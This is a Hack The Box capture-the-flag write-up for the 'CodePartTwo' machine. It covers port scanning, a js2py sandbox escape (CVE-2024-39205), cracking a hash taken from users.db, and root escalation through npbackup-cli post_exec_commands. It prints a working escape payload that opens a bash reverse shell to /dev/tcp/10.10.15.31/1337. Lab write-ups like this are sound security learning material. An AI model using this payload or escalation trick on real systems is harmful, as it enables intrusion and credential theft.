# CodePartTwo from hackthebox
<img width="300" height="300" alt="image" src="https://github.com/user-attachments/assets/d92aba2d-bf2d-4636-aecf-f81292a43078" />

## Enumeration<br>
First I tried to gather information starting with nmap:
```bash
sudo nmap -sC -sV 10.129.232.59 --min-rate=1000 -T4
```
<img width="845" height="369" alt="image" src="https://github.com/user-attachments/assets/a823fd99-a92e-4c26-9cc1-073cf9993cad" />

Looking at the response Gunicorn 20.0.4 distracted me because there is CVE for this version but we have website active using 8000 port.

We have options to register, login and download source code of the app<br>
<img width="1844" height="870" alt="image" src="https://github.com/user-attachments/assets/041d1855-029a-4bc3-a027-d971f2efb5c9" />

Let's download the codes then register to see what we have after login!<br>

File contents:<br>
<img width="337" height="387" alt="image" src="https://github.com/user-attachments/assets/f3df5eef-8e49-4369-a0ee-ba9b3707a88b" />

<b> DO not forget to register and Login</b>

After login we have sandbox to execute java script codes and if we type `{{7*7}}` we can confirm there is execution!

<img width="1162" height="792" alt="image" src="https://github.com/user-attachments/assets/8401dcc8-bb28-44b6-95a4-31feddc1f265" />


After sometimes searching clue from downloaded files I find my attack vector:<br>
By looking at the  `requirements.txt` you can see `js2py==0.74` which is vulnerable to RCE and it is assigned to <b>CVE-2024-39205<b><br>

## Foothold

For remote code execution I used this payload to get shell:
```bash
let cmd = "echo 'bash -i >& /dev/tcp/10.10.15.31/1337 0>&1' | bash"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```
DO NOT forget to change your IP and listening PORT<br>

After getting a shell we can see there is app and marco user:
<img width="721" height="471" alt="image" src="https://github.com/user-attachments/assets/1199f238-8d48-43c2-8788-5cb1e13ae107" />

## Lateral movement

However inside `instance` directory from `/home/app/app/instance` we have `users.db` which we can enumerate and capture hash password of marco users:<br>

1) `sqlite3 users.db`
2) `.tables` -> to see table names -> We have `user` table
3) `.schema` -> to see schema of tables -> we can see `password_hash` and `username` schemas for user table
4) `select password_hash, username from user;` -> to see password hash of marco user.

After we get the hash we can use crackstation.net to crack the hash then we will simply login to marco using ssh<br>
<img width="523" height="467" alt="image" src="https://github.com/user-attachments/assets/574e9edf-b29e-4b3b-b645-401933df6109" />

## Privilege escalation

Using `sudo -l` we can see we are allowed to use `/usr/local/bin/npbackup-cli` as root without password:
```bash
marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
marco@codeparttwo:~$ 
```
This program used with .conf config files like : `sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf -b`

But to exploit this we need to create our own .conf files copying everything from `npbackup.conf` and changing 2 things:
1) First copy npbackup.conf: `cp npbackup.conf test.conf`<br>
2) Then first change Paths:
```bash
paths:                
      - /home/app/app 
```
change above path to `/usr/lib`<br>
3) After that we need to change `post_exec_commands: []` to `post_exec_commands: [cat /root/root.txt > /tmp/root.txt]`
4) Execute: `sudo /usr/local/bin/npbackup-cli -c test.conf -b`
5) After execution I hit Ctrl+C then went to /tmp directory and retreived root flag you can write rever shell as well to get root shell:<br>
```bash
marco@codeparttwo:~$ cp npbackup.conf test.conf                                                                                                                                                                                               
marco@codeparttwo:~$ nano test.conf                                                                                    
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c test.conf -b
```
<img width="1313" height="113" alt="image" src="https://github.com/user-attachments/assets/f035d2a8-375c-4f09-b5aa-8df04627c3fd" />


